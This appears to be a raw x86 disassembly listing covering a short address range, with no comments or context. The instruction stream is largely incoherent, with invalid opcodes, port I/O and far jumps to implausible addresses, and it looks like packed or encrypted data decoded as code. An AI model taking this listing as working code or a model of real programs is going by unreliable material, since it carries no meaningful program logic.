  402100:	rol    BYTE PTR [ebp-0x5bdc985a],0x2d
  402107:	jb     0x4020fc
  402109:	dec    ebp
  40210a:	mov    fs,WORD PTR [edi+ebx*4-0x2bcdfd52]
  402111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402112:	les    ecx,FWORD PTR [eax-0x3c9dd12]
  402118:	jl     0x4020a3
  40211a:	call   0x426e047a
  40211f:	push   ss
  402120:	stos   DWORD PTR es:[edi],eax
  402121:	mov    al,0x4
  402123:	stos   DWORD PTR es:[edi],eax
  402124:	int    0x45
  402126:	shr    BYTE PTR [esi+0x3b],0xd3
  40212a:	jnp    0x40213d
  40212c:	fiadd  DWORD PTR [esp+esi*8+0x51]
  402130:	stc    
  402131:	xor    ah,BYTE PTR [eax]
  402133:	jbe    0x4021b4
  402135:	fcmovnb st,st(1)
  402137:	div    al
  402139:	aad    0x29
  40213b:	pop    esi
  40213c:	and    eax,0xc3eaa3a
  402141:	inc    esi
  402142:	add    DWORD PTR [edi],0x4d
  402145:	fild   DWORD PTR [ebx-0x6298772c]
  40214b:	lock dec edi
  40214d:	dec    edi
  40214e:	cmp    BYTE PTR [esi],cl
  402150:	bound  ecx,QWORD PTR [edi]
  402152:	out    dx,eax
  402153:	or     al,0xd3
  402155:	femms  
  402157:	out    dx,eax
  402158:	ret    
  402159:	mov    ecx,0xb1db1241
  40215e:	and    si,cx
  402161:	out    0x6d,al
  402163:	or     ebp,eax
  402165:	idiv   DWORD PTR [edx*2+0x54ff7d1a]
  40216c:	or     al,0x1c
  40216e:	cli    
  40216f:	mov    BYTE PTR [esi+0x59b67d6c],al
  402175:	or     al,0x36
  402177:	mov    eax,0xe3288db4
  40217c:	ins    DWORD PTR es:[edi],dx
  40217d:	push   ss
  40217e:	cli    
  40217f:	push   0xffffffb3
  402181:	jne    0x40212e
  402183:	xor    ch,ch
  402185:	sbb    dl,BYTE PTR [ebx+0x718555cb]
  40218b:	jmp    0x1346:0x70e716b4
  402192:	fiadd  WORD PTR ds:[ecx+0x4b]
  402196:	js     0x402161
  402198:	jecxz  0x402130
  40219a:	lods   al,BYTE PTR ds:[esi]
  40219b:	sahf   
  40219c:	(bad)  
  40219d:	or     eax,0x52ca0239
  4021a2:	out    0x5b,eax
  4021a4:	jg     0x40220d
  4021a6:	and    al,0x98
  4021a8:	lds    edi,FWORD PTR [bp-0x74]
  4021ac:	ret    0x8a09
  4021af:	sbb    DWORD PTR [ebp-0x4a91ce09],esp
  4021b5:	call   0xe86:0xd4b38843
  4021bc:	inc    ebx
  4021bd:	sub    BYTE PTR [edi],al
  4021bf:	hlt    
  4021c0:	call   0x2253cae9
  4021c5:	jp     0x4021ad
  4021c7:	push   0x30
  4021c9:	inc    ebp
  4021ca:	cmp    al,0x87
  4021cc:	sbb    BYTE PTR [ebp+0x54],dh
  4021cf:	mov    ah,0x97
  4021d1:	inc    esi
  4021d2:	ja     0x402241
  4021d4:	hlt    
  4021d5:	shl    BYTE PTR [ecx-0x37116a90],1
  4021db:	mov    al,ds:0xeeaf487b
  4021e0:	addr16 nop
  4021e2:	pop    ebx
  4021e3:	xor    DWORD PTR [eax+eiz*8-0x54],ecx
  4021e7:	jbe    0x402193
  4021e9:	in     al,dx
  4021ea:	or     DWORD PTR [ebx-0x5c],esp
  4021ed:	in     al,dx
  4021ee:	sub    eax,0x625e9ee
  4021f3:	sbb    BYTE PTR [edx],cl
  4021f5:	adc    al,0x78
  4021f7:	mov    ch,0xc2
  4021f9:	lods   al,BYTE PTR ds:[esi]
  4021fa:	mov    edi,0xb14ca7e2
  4021ff:	adc    DWORD PTR [edx+0x1a],0x70
  402203:	(bad)  [esi]
  402205:	or     dl,BYTE PTR [ecx-0x20db089d]
  40220b:	scas   al,BYTE PTR es:[edi]
  40220c:	mov    eax,ds:0x3c3605a9
  402211:	dec    eax
  402212:	lahf   
  402213:	outs   dx,DWORD PTR ds:[esi]
  402214:	dec    edx
  402215:	cwde   
  402216:	push   esp
  402217:	clc    
  402218:	call   0xf96393b6
  40221d:	jle    0x4021b9
  40221f:	out    dx,al
  402220:	or     DWORD PTR [ebx-0x36],esp
  402223:	xor    bl,BYTE PTR [ebx+0x35ce6ecb]
  402229:	test   DWORD PTR [edx-0x3e761479],esp
  40222f:	and    bl,BYTE PTR [eax+0x26]
  402232:	popa   
  402233:	mov    ecx,0xb2d60ec3
  402238:	adc    DWORD PTR [esi-0x4defba3d],esp
  40223e:	mov    ch,0xca
  402240:	adc    al,0x2e
  402242:	fcomp  DWORD PTR [edx+ecx*8]
  402245:	mov    dh,0x49
  402247:	sub    bh,BYTE PTR [ecx-0x2f0d42f0]
  40224d:	mov    ds:0x2c043d30,al
  402252:	je     0x402280
  402254:	std    
  402255:	fistp  QWORD PTR [ebx+0x58]
  402258:	lds    ebp,FWORD PTR [eax-0x5]
  40225b:	repnz pushf 
  40225d:	or     ecx,DWORD PTR [ecx-0x39]
  402260:	mov    esi,0xcdc9be24
  402265:	sub    eax,0x1778b
  40226a:	imul   ebx,DWORD PTR [esp+ebx*1],0x25
  40226e:	push   esp
  40226f:	iret   
  402270:	adc    al,0x15
  402272:	mov    edi,0xbffc16e9
  402277:	push   edx
  402278:	pop    esp
  402279:	and    eax,0x15e0830e
  40227e:	out    0xe8,eax
  402280:	inc    ebx
  402281:	nop
  402282:	push   es
  402283:	call   0x7a5982b5
  402288:	or     edi,edi
  40228a:	cmp    edx,ebp
  40228c:	push   0x7d
  40228e:	ins    BYTE PTR es:[edi],dx
  40228f:	mov    dl,0x27
  402291:	std    
  402292:	mov    dh,0xca
  402294:	xchg   esi,eax
  402295:	lea    ebx,[edx]
  402297:	cmpxchg DWORD PTR [ebp-0x31],ecx
  40229b:	pop    esp
  40229c:	push   ss
  40229d:	mov    cl,0x35
  40229f:	(bad)  
  4022a0:	mov    edi,DWORD PTR [eax]
  4022a2:	cwde   
  4022a3:	fst    QWORD PTR [esi+0x3c]
  4022a6:	sbb    dl,BYTE PTR [esi+0x63edc60d]
  4022ac:	adc    eax,DWORD PTR [edx+0x7f6ac21f]
  4022b2:	pop    edi
  4022b3:	fiadd  WORD PTR [esi+0x2598139a]
  4022b9:	or     DWORD PTR [edi],0x6d
  4022bc:	jmp    0x4022a3
  4022be:	ds pop ss
  4022c0:	jecxz  0x4022dc
  4022c2:	or     bh,BYTE PTR [ebp+0xc16b54]
  4022c8:	in     eax,0x9f
  4022ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022cb:	cmp    edx,edx
  4022cd:	xchg   ebx,eax
  4022ce:	mov    esi,0x990d3db1
  4022d3:	pop    ss
  4022d4:	int    0x70
  4022d6:	lahf   
  4022d7:	mov    dl,0xd
  4022d9:	sub    al,0x5b
  4022db:	call   0x8f4c0214
  4022e0:	ds jbe 0x40230c
  4022e3:	jl     0x4022e4
  4022e5:	jns    0x4022b1
  4022e7:	dec    esi
  4022e8:	add    ah,BYTE PTR [edx]
  4022ea:	push   ds
  4022eb:	pop    ebx
  4022ec:	mov    ebx,0x72183594
  4022f1:	out    dx,eax
  4022f2:	xor    al,ch
  4022f4:	adc    ah,BYTE PTR [edi-0x305e5879]
  4022fa:	sub    eax,0xd8c7b122
  4022ff:	or     ch,dh
  402301:	sub    eax,DWORD PTR [esi+ecx*8-0x5e5bd6cb]
  402308:	mov    eax,ds:0xb6a89e78
  40230d:	cli    
  40230e:	push   ebx
  40230f:	adc    DWORD PTR [eax+0x6484fd05],esi
  402315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402316:	adc    bh,BYTE PTR [eax-0x36]
  402319:	std    
  40231a:	sbb    eax,0x55f00eaf
  40231f:	mov    eax,0x3da8cca9
  402324:	mov    ah,0x1d
  402326:	push   ebx
  402327:	sub    cl,0x32
  40232a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40232b:	fidiv  WORD PTR [ecx+0x31ac5974]
  402331:	in     al,dx
  402332:	adc    ah,bh
  402334:	xlat   BYTE PTR ds:[ebx]
  402335:	jp     0x40232a
  402337:	into   
  402338:	jl     0x4022f3
  40233a:	in     al,dx
  40233b:	loop   0x4023a0
  40233d:	fisttp DWORD PTR [esi+0x69]
  402340:	cmp    eax,0x875a4ecd
  402345:	repnz loop 0x402364
  402348:	aaa    
  402349:	mov    ecx,0xd5f06f25
  40234e:	mov    DWORD PTR [edx],0xc28b0ad0
  402354:	pusha  
  402355:	pushf  
  402356:	rcl    DWORD PTR [edx-0x5a1c3712],1
  40235c:	data16 test BYTE PTR [ebx-0x5c],bh
  402360:	and    al,0x7f
  402362:	les    esi,FWORD PTR [ecx-0x42]
  402365:	fistp  DWORD PTR [eax-0x57]
  402368:	or     DWORD PTR [edx-0x47],edi
  40236b:	lock out dx,al
  40236d:	xor    DWORD PTR [ecx],esp
  40236f:	mov    WORD PTR [ebp-0x665ae14],?
  402375:	loopne 0x40230a
  402377:	or     bl,BYTE PTR [esp+0x25]
  40237b:	enter  0x7d47,0x10
  40237f:	es pop eax
  402381:	in     eax,0xba
  402383:	xchg   ebx,eax
  402384:	not    DWORD PTR [esi]
  402386:	mov    edx,0x285dca47
  40238b:	(bad)  
  40238d:	jg     0x402349
  40238f:	sbb    BYTE PTR [ebx-0x525c29fd],ch
  402395:	cs aas 
  402397:	fild   DWORD PTR [edi+0x30]
  40239a:	cmc    
  40239b:	xor    ch,BYTE PTR [eax]
  40239d:	mov    ch,0xf2
  40239f:	or     bh,ah
  4023a1:	in     eax,0xa0
  4023a3:	cmp    ch,0x4a
  4023a6:	clc    
  4023a7:	data16 and al,0x7b
  4023aa:	cmp    DWORD PTR [edi+0xa5c3eef],0x3ee33ed6
  4023b4:	lods   al,BYTE PTR ds:[esi]
  4023b5:	(bad)  
  4023b6:	cli    
  4023b7:	mov    BYTE PTR [edx],cl
  4023b9:	jg     0x402360
  4023bb:	sub    al,0x4b
  4023bd:	(bad)  
  4023be:	xchg   ecx,eax
  4023bf:	push   ebx
  4023c0:	cmovg  edx,edi
  4023c3:	adc    edx,DWORD PTR [esi+0x48]
  4023c6:	or     dl,ch
  4023c8:	aas    
  4023c9:	outs   dx,DWORD PTR ds:[esi]
  4023ca:	jb     0x4023cf
  4023cc:	dec    ebp
  4023cd:	cwde   
  4023ce:	jb     0x402358
  4023d0:	in     eax,dx
  4023d1:	cmp    al,0x52
  4023d3:	fisttp WORD PTR [esi-0x2fa0b3d]
  4023d9:	jmp    0x7bf0:0x85949d
  4023e0:	adc    eax,0xa9fa45a1
  4023e5:	cs xchg edx,eax
  4023e7:	pop    es
  4023e8:	loope  0x40244f
  4023ea:	ins    BYTE PTR es:[edi],dx
  4023eb:	popa   
  4023ec:	hlt    
  4023ed:	outs   dx,BYTE PTR ds:[esi]
  4023ee:	mov    al,0x51
  4023f0:	sub    al,0x6c
  4023f2:	xor    BYTE PTR [edi+0x4f],dl
  4023f5:	ror    BYTE PTR [ebx-0x4b],1
  4023f8:	ins    BYTE PTR es:[edi],dx
  4023f9:	imul   esp,DWORD PTR [edx],0x17bca20b
  4023ff:	xor    al,BYTE PTR [ebx-0x3c]
  402402:	sbb    ch,ch
  402404:	ret    
  402405:	xchg   bl,al
  402407:	idiv   DWORD PTR [ecx-0x68]
  40240a:	in     al,dx
  40240b:	aam    0x31
  40240d:	mov    ebp,0xcb55b09d
  402412:	stos   BYTE PTR es:[edi],al
  402413:	les    ebx,FWORD PTR [eax]
  402415:	cmp    BYTE PTR [edi-0x41],0x18
  402419:	cdq    
  40241a:	adc    bh,dh
  40241c:	mov    dh,0x25
  40241e:	sti    
  40241f:	xchg   esi,eax
  402420:	out    dx,al
  402421:	ss leave 
  402423:	and    eax,0x6db9fe34
  402428:	add    BYTE PTR [ebx+edx*8+0x30],0xbc
  40242d:	nop
  40242e:	mov    BYTE PTR [eax-0x81e0c04],bh
  402434:	xlat   BYTE PTR ds:[ebx]
  402435:	adc    DWORD PTR [eax+0x35],0x4f
  402439:	(bad)  
  40243a:	outs   dx,BYTE PTR ds:[esi]
  40243b:	sbb    BYTE PTR [edx-0x26],bh
  40243e:	outs   dx,BYTE PTR ds:[esi]
  40243f:	jle    0x4024a5
  402441:	mov    dh,cl
  402443:	bound  edx,QWORD PTR [ecx-0x19b1ff89]
  402449:	loopne 0x402480
  40244b:	clc    
  40244c:	fiadd  DWORD PTR [edx-0x5ffd321f]
  402452:	daa    
  402453:	lods   eax,DWORD PTR ds:[esi]
  402454:	push   ax
  402456:	in     al,0xb
  402458:	popa   
  402459:	int3   
  40245a:	adc    edi,edx
  40245c:	inc    ecx
  40245d:	mov    WORD PTR [esi+0xfe95d6],?
  402463:	adc    al,0x17
  402465:	xchg   esp,eax
  402466:	sub    BYTE PTR [edi-0xe5c46b],dh
  40246c:	retf   
  40246d:	test   BYTE PTR [edx+0x3d],bl
  402470:	ds imul dh
  402473:	loop   0x402494
  402475:	test   BYTE PTR [esi*2-0x5b0db7a0],dh
  40247c:	inc    edx
  40247d:	shl    DWORD PTR [edx],1
  40247f:	push   ds
  402480:	outs   dx,BYTE PTR ds:[esi]
  402481:	scas   eax,DWORD PTR es:[edi]
  402482:	sbb    eax,0xe1ee2f1c
  402487:	fidiv  WORD PTR [edx]
  402489:	loope  0x402412
  40248b:	outs   dx,BYTE PTR ds:[esi]
  40248c:	es push eax
  40248e:	aam    0x58
  402490:	adc    BYTE PTR ds:0x12eaaada,ch
  402496:	xchg   DWORD PTR [esi-0x7d713a8b],esp
  40249c:	push   edx
  40249d:	ret    
  40249e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40249f:	fist   WORD PTR [ebx-0x4571d717]
  4024a5:	test   DWORD PTR [esi+0x3eb556f9],eax
  4024ab:	cld    
  4024ac:	push   si
  4024ae:	int3   
  4024af:	out    0x33,eax
  4024b1:	inc    ecx
  4024b2:	jbe    0x402497
  4024b4:	push   0xd9c28cee
  4024b9:	pusha  
  4024ba:	cdq    
  4024bb:	jns    0x40248e
  4024bd:	jmp    0x4024f8
  4024bf:	in     al,0xf2
  4024c1:	and    DWORD PTR [ecx],esi
  4024c3:	loope  0x402522
  4024c5:	push   edx
  4024c6:	jo     0x4024a7
  4024c8:	push   0x48
  4024ca:	xlat   BYTE PTR ds:[ebx]
  4024cb:	mov    dh,0x45
  4024cd:	mov    WORD PTR [eax+0x30e33b6b],?
  4024d3:	in     al,0x41
  4024d5:	dec    edi
  4024d6:	ds ss adc eax,0xcc0f3d1
  4024dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024de:	xchg   edi,eax
  4024df:	ret    0xdaaf
  4024e2:	mov    ?,WORD PTR [ebx]
  4024e4:	add    esi,DWORD PTR [bp+si+0x3f1c]
  4024e9:	es cmc 
  4024eb:	jbe    0x4024a9
  4024ed:	fwait
  4024ee:	xor    esi,DWORD PTR [eax+0x3f90b40a]
  4024f4:	or     al,0xf8
  4024f6:	adc    al,0xf6
  4024f8:	dec    edx
  4024f9:	push   cs
  4024fa:	lods   al,BYTE PTR ds:[esi]
  4024fb:	adc    eax,0xfca30367
  402500:	mov    bh,0x9d
  402502:	ret    0xd1f8
  402505:	dec    esp
  402506:	mov    dh,0xc1
  402508:	stos   BYTE PTR es:[edi],al
  402509:	inc    esi
  40250a:	lahf   
  40250b:	cs fwait
  40250d:	cmp    esp,DWORD PTR [eax]
  40250f:	das    
  402510:	repz gs jle 0x4024df
  402514:	(bad)  
  402515:	int    0x52
  402517:	push   ds
  402518:	xor    DWORD PTR [ecx-0x77968d4c],esi
  40251e:	ror    esp,cl
  402520:	sub    edi,esi
  402522:	pop    ebx
  402523:	dec    eax
  402524:	push   ss
  402525:	xor    al,0xeb
  402527:	pop    eax
  402528:	test   DWORD PTR [esi],eax
  40252a:	cmp    al,0xeb
  40252c:	je     0x4025a9
  40252e:	data16 jnp 0x4024b7
  402531:	jae    0x4024b5
  402533:	fdiv   st(1),st
  402535:	sbb    ebx,ebx
  402537:	in     al,0xb4
  402539:	ret    0xed8c
  40253c:	in     eax,0x3a
  40253e:	mov    dh,0xcc
  402540:	pop    ds
  402541:	test   eax,0x2c2258f8
  402546:	scas   eax,DWORD PTR es:[edi]
  402547:	sbb    DWORD PTR [edx-0x21],esi
  40254a:	div    BYTE PTR [ebx]
  40254c:	lea    ebp,[edi-0x10]
  40254f:	xlat   BYTE PTR ds:[ebx]
  402550:	popf   
  402551:	stc    
  402552:	mov    ss,ebp
  402554:	or     eax,0x69ed25db
  402559:	lea    ecx,[eax-0x7]
  40255c:	ja     0x402594
  40255e:	xor    esp,ecx
  402560:	(bad)  
  402561:	xchg   esp,eax
  402562:	loope  0x4025ba
  402564:	outs   dx,BYTE PTR ds:[esi]
  402565:	call   0xa30e:0xb4514765
  40256c:	dec    ebx
  40256d:	ds out 0x15,eax
  402570:	(bad)  
  402571:	mov    al,ds:0x161e75c9
  402576:	jns    0x40258b
  402578:	stos   DWORD PTR es:[edi],eax
  402579:	sub    eax,0x7820072c
  40257e:	pop    esp
  40257f:	xchg   esi,eax
  402580:	dec    ecx
  402581:	xchg   esp,eax
  402582:	in     eax,0xb
  402584:	jb     0x402532
  402586:	mov    cl,0x3b
  402588:	push   0xffffffc7
  40258a:	xchg   ecx,edx
  40258c:	ret    0x4fad
  40258f:	fs das 
  402591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402592:	push   edx
  402593:	inc    bh
  402595:	test   eax,0x54387951
  40259a:	pop    ebx
  40259b:	lods   al,BYTE PTR ds:[esi]
  40259c:	cmp    bh,ah
  40259e:	mov    BYTE PTR [ebx-0x42b985a2],ch
  4025a4:	push   eax
  4025a5:	or     DWORD PTR [ecx+0x6203c7dc],ebx
  4025ab:	xchg   edi,eax
  4025ac:	cld    
  4025ad:	jns    0x40260f
  4025af:	inc    ebp
  4025b0:	and    eax,0x31bc327c
  4025b5:	mov    ebp,DWORD PTR [edi-0x37]
  4025b8:	ja     0x40258d
  4025ba:	cld    
  4025bb:	cmp    ah,cl
  4025bd:	stos   DWORD PTR es:[edi],eax
  4025be:	adc    BYTE PTR [ebp+edi*1-0x52],0xd3
  4025c3:	jle    0x4025b5
  4025c5:	div    DWORD PTR [edx]
  4025c7:	push   ds
  4025c8:	mov    dh,0xe4
  4025ca:	pop    ss
  4025cb:	ret    0x96ea
  4025ce:	pop    edi
  4025cf:	mov    bh,0xcc
  4025d1:	popa   
  4025d2:	aad    0xad
  4025d4:	xchg   BYTE PTR [edx-0x3e1f7210],al
  4025da:	(bad)
  4025de:	pop    edi
  4025df:	dec    edi
  4025e0:	push   eax
  4025e1:	cwde   
  4025e2:	lods   al,BYTE PTR ds:[esi]
  4025e3:	add    DWORD PTR [edx+0x38],0x357cdd7f
  4025ea:	jg     0x402615
  4025ec:	sbb    cl,ch
  4025ee:	loop   0x402626
  4025f0:	daa    
  4025f1:	les    edi,FWORD PTR [eax-0x79656e8c]
  4025f7:	mov    dl,0x8f
  4025f9:	push   es
  4025fa:	lock outs dx,DWORD PTR ds:[esi]
  4025fc:	mov    WORD PTR [ebp+0x2e],?
  4025ff:	pusha  
  402600:	sub    al,ch
  402602:	stos   BYTE PTR es:[edi],al
  402603:	xor    edx,edi
  402605:	mov    ebp,0x309df116
  40260a:	cmp    ah,bh
  40260c:	js     0x402688
  40260e:	mov    BYTE PTR [ebx-0x629c73bf],bl
  402614:	push   esi
  402615:	xor    dl,ah
  402617:	dec    ebx
  402618:	mov    ah,0x70
  40261a:	fild   DWORD PTR [edi]
  40261c:	out    0x17,al
  40261e:	xchg   esi,eax
  40261f:	push   eax
  402620:	add    eax,0x8aa7c708
  402625:	dec    edx
  402626:	rcr    esi,1
  402628:	pop    esi
  402629:	xchg   edx,eax
  40262a:	lock cs daa 
  40262d:	add    al,0x2a
  40262f:	jno    0x402654
  402631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402632:	inc    eax
  402633:	xchg   ebp,eax
  402634:	fild   DWORD PTR [esi+0x50d0d462]
  40263a:	jg     0x40267f
  40263c:	or     eax,0x91c0d0d8
  402641:	adc    dh,0xe6
  402644:	pop    ecx
  402645:	cmp    ebx,DWORD PTR [ebx-0x6b]
  402648:	pop    DWORD PTR [ebx-0x80]
  40264b:	rcl    edx,0x22
  40264e:	jmp    0x365a:0xff199b10
  402655:	pop    esp
  402656:	inc    esp
  402657:	(bad)  
  402658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402659:	pusha  
  40265a:	int    0xd7
  40265c:	dec    esp
  40265d:	mov    esi,0x43c86841
  402662:	(bad)  
  402663:	int    0xe2
  402665:	push   0x3e909705
  40266a:	mov    ecx,0xaa308c06
  40266f:	cwde   
  402670:	cmc    
  402671:	fcom   QWORD PTR [edi]
  402673:	fcmovu st,st(0)
  402675:	add    cl,BYTE PTR [eax-0x25]
  402678:	mov    ah,0xeb
  40267a:	lahf   
  40267b:	xchg   BYTE PTR [ebx+0x47240e5b],ch
  402681:	xor    eax,0x4f7c0b20
  402686:	aam    0x3e
  402688:	sbb    bh,BYTE PTR [edi]
  40268a:	sub    eax,0x12b6ecc
  40268f:	adc    BYTE PTR [edi-0x23e0d915],ah
  402695:	fwait
  402696:	sub    eax,0x9b2eb277
  40269b:	scas   eax,DWORD PTR es:[edi]
  40269c:	dec    esp
  40269d:	test   DWORD PTR [esi+0x5504036b],ebp
  4026a3:	(bad)  
  4026a4:	aas    
  4026a5:	lds    ebx,FWORD PTR [eax-0xf]
  4026a8:	xor    DWORD PTR [ebp+0x3a],eax
  4026ab:	outs   dx,DWORD PTR ds:[esi]
  4026ac:	cs stos BYTE PTR es:[edi],al
  4026ae:	jno    0x4026b9
  4026b0:	or     dh,BYTE PTR [edx+0x5575fe57]
  4026b6:	add    edx,edx
  4026b8:	ds and ch,ah
  4026bb:	sub    al,0x63
  4026bd:	dec    esp
  4026be:	in     al,0x1d
  4026c0:	ror    BYTE PTR [ebx],cl
  4026c2:	nop
  4026c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026c4:	fld    DWORD PTR [ebx-0x1b47c611]
  4026ca:	inc    ecx
  4026cb:	imul   esi,DWORD PTR [edx-0x2e],0xcd37da21
  4026d2:	mov    ebx,0x6ef26c49
  4026d7:	and    DWORD PTR [eax],ebp
  4026d9:	xchg   ecx,eax
  4026da:	clc    
  4026db:	dec    BYTE PTR cs:[edx+0x34ec138]
  4026e2:	(bad)  
  4026e3:	(bad)
  4026e6:	(bad)  [ebx+edi*8+0x625e3e0a]
  4026ed:	cld    
  4026ee:	and    dh,BYTE PTR [eax-0x861524f]
  4026f4:	popf   
  4026f5:	jae    0x4026b7
  4026f7:	mov    bl,0xd5
  4026f9:	in     eax,0x33
  4026fb:	icebp  
  4026fc:	inc    ebp
  4026fd:	xor    DWORD PTR [eax],ebp
  4026ff:	rcl    BYTE PTR [ebx],cl
  402701:	ret    
  402702:	jmp    0x9d74:0x63bb45c7
  402709:	jb     0x4026a2
  40270b:	mov    dl,0x8a
  40270d:	imul   ecx,DWORD PTR ds:0x18ba7c9f,0x6b4e522b
  402717:	sbb    ebp,DWORD PTR [eax+0x22]
  40271a:	xor    al,0xeb
  40271c:	in     eax,dx
  40271d:	scas   al,BYTE PTR es:[edi]
  40271e:	sub    esi,edx
  402720:	inc    eax
  402721:	out    0x48,eax
  402723:	(bad)  
  402724:	enter  0xef74,0x9b
  402728:	retf   
  402729:	xchg   ebp,eax
  40272a:	fdiv   st,st(2)
  40272c:	cmp    ecx,edi
  40272e:	fst    st(2)
  402730:	mov    dl,al
  402732:	mov    DWORD PTR [edx],ebp
  402734:	test   dh,ch
  402736:	xchg   ebx,eax
  402737:	jmp    FWORD PTR [eax+esi*2]
  40273a:	mov    ebp,0x1b28663c
  40273f:	out    0x72,al
  402741:	cwde   
  402742:	push   ebx
  402743:	push   cs
  402744:	mov    cl,0x43
  402746:	mov    ch,0x45
  402749:	stc    
  40274a:	loope  0x4027c1
  40274c:	retf   
  40274d:	mov    al,0xca
  40274f:	sti    
  402750:	ret    0x25bb
  402753:	std    
  402754:	push   0x316e2bda
  402759:	jecxz  0x4027ae
  40275b:	add    eax,0x826778f0
  402760:	gs ret 0xb130
  402764:	pop    edi
  402765:	rcl    BYTE PTR [eax+0x4fabc7a9],0x13
  40276c:	dec    edi
  40276d:	cmc    
  40276e:	xchg   esi,eax
  40276f:	cmp    BYTE PTR [ebx+eax*8-0xd63a821],bl
  402776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402777:	inc    esp
  402778:	cmc    
  402779:	add    esi,DWORD PTR [ebx+0x21]
  40277c:	fwait
  40277d:	mov    bl,0x3f
  40277f:	int3   
  402780:	pop    es
  402781:	cmp    al,0xc7
  402783:	cmc    
  402784:	inc    DWORD PTR [ebx-0x2e]
  402787:	mov    dl,0xa4
  402789:	out    dx,eax
  40278a:	cmp    eax,0x9ecc29ce
  40278f:	jb     0x40273e
  402791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402792:	sub    cl,dl
  402794:	ins    DWORD PTR es:[edi],dx
  402795:	mov    dh,BYTE PTR [ebp+ebp*1+0x34994f6c]
  40279c:	mov    ds,WORD PTR [eax+eax*2+0x6e8a40ab]
  4027a3:	add    edi,ecx
  4027a5:	rol    BYTE PTR [edi+ebx*4],0xf9
  4027a9:	aaa    
  4027aa:	xor    al,0x25
  4027ac:	add    al,0xe8
  4027ae:	ss iret 
  4027b0:	stos   BYTE PTR es:[edi],al
  4027b1:	fisub  WORD PTR [ecx]
  4027b3:	(bad)  
  4027b4:	ins    DWORD PTR es:[edi],dx
  4027b5:	mov    ecx,0x1584a840
  4027ba:	ja     0x4027e4
  4027bc:	ds dec esi
  4027be:	lahf   
  4027bf:	and    BYTE PTR [eax],0x83
  4027c2:	pop    es
  4027c3:	shl    DWORD PTR [edi+0x24c380c],0xd2
  4027ca:	push   esi
  4027cb:	mov    ds,WORD PTR [ebx-0x58]
  4027ce:	jae    0x4027c2
  4027d0:	imul   ebx,esi,0x4a446ec6
  4027d6:	dec    eax
  4027d7:	rcl    BYTE PTR [eax+0x1185c9b5],1
  4027dd:	add    DWORD PTR [ebp-0x6c],edi
  4027e0:	ror    BYTE PTR [esi],1
  4027e2:	shr    BYTE PTR [eax-0x6be686f9],0x59
  4027e9:	fisub  WORD PTR [edx]
  4027eb:	fidiv  WORD PTR [edx-0x51]
  4027ee:	xlat   BYTE PTR ds:[ebx]
  4027ef:	jo     0x4027e4
  4027f1:	xchg   DWORD PTR es:[edx-0x72],esp
  4027f5:	xchg   esi,eax
  4027f6:	fdiv   st,st(6)
  4027f8:	pop    esi
  4027f9:	daa    
  4027fa:	hlt    
  4027fb:	gs mov al,0x4
  4027fe:	or     DWORD PTR [ecx-0x6dd02936],0xb4e9b9b4
  402808:	mov    bh,BYTE PTR [ebp-0x6e0c4a32]
  40280e:	in     al,0xf9
  402810:	push   eax
  402811:	stc    
  402812:	(bad)  
  402813:	int3   
  402814:	stos   DWORD PTR es:[edi],eax
  402815:	mov    dh,0xc3
  402817:	mov    ds:0xb09fe871,al
  40281c:	or     eax,0x5c841b9e
  402821:	push   ss
  402822:	ror    BYTE PTR [edi+0xe],1
  402825:	test   BYTE PTR [ebx+0x2f],cl
  402828:	rcr    ecx,1
  40282a:	push   es
  40282b:	push   ds
  40282c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40282d:	push   ebx
  40282e:	leave  
  40282f:	bnd jl 0x402895
  402832:	imul   edi,DWORD PTR [ebx-0x2285b691],0x77c73d2d
  40283c:	leave  
  40283d:	clc    
  40283e:	or     DWORD PTR [ebp-0x27dba485],edi
  402844:	(bad)  
  402845:	out    dx,eax
  402846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402847:	add    eax,0xb724eb60
  40284c:	repnz xor al,0x95
  40284f:	je     0x40280e
  402851:	jmp    0x8b238924
  402856:	popf   
  402857:	and    BYTE PTR [edx-0x4dc1ae5e],bl
  40285d:	aaa    
  40285e:	inc    ecx
  40285f:	jmp    0x402844
  402861:	or     eax,0xc45a73
  402866:	cmp    BYTE PTR [edi],dh
  402868:	mov    bl,0x6c
  40286a:	mov    ebp,0xc25d50d
  40286f:	ss pop ebp
  402871:	dec    esp
  402872:	pop    esi
  402873:	sub    DWORD PTR [edi],ebp
  402875:	dec    edi
  402876:	cld    
  402877:	add    al,cl
  402879:	jecxz  0x40285e
  40287b:	inc    edx
  40287c:	mov    al,ds:0x3393f51f
  402882:	mov    ebp,0xa0cfe8e7
  402887:	clc    
  402888:	iret   
  402889:	outs   dx,BYTE PTR ds:[esi]
  40288a:	xor    edx,edx
  40288c:	sbb    BYTE PTR [esi+0x79f67f50],cl
  402892:	xchg   BYTE PTR [ebx-0x5d],cl
  402895:	pusha  
  402896:	rcr    BYTE PTR [ebx+0x36b98768],1
  40289c:	inc    ebx
  40289d:	jg     0x4028b7
  40289f:	add    eax,0xeabdb35b
  4028a4:	mov    BYTE PTR [ebx+0x20867d0f],0x54
  4028ab:	mov    edi,0xc734cb80
  4028b0:	adc    cl,bl
  4028b2:	sar    DWORD PTR [eax+0x68e48d73],cl
  4028b8:	lds    eax,FWORD PTR [eax]
  4028ba:	adc    DWORD PTR es:[edx+0x5100daa2],ebx
  4028c1:	retf   0xccd6
  4028c4:	mov    eax,ds:0x54445048
  4028c9:	mov    al,ds:0x461a95d8
  4028ce:	mov    ah,0x38
  4028d0:	push   ss
  4028d1:	sub    BYTE PTR [edi-0x4c],cl
  4028d4:	and    BYTE PTR [edi-0x17440b79],ch
  4028da:	scas   eax,DWORD PTR es:[edi]
  4028db:	addr16 inc ebp
  4028dd:	mov    cl,0x95
  4028df:	mov    cl,BYTE PTR ds:0x110e9a72
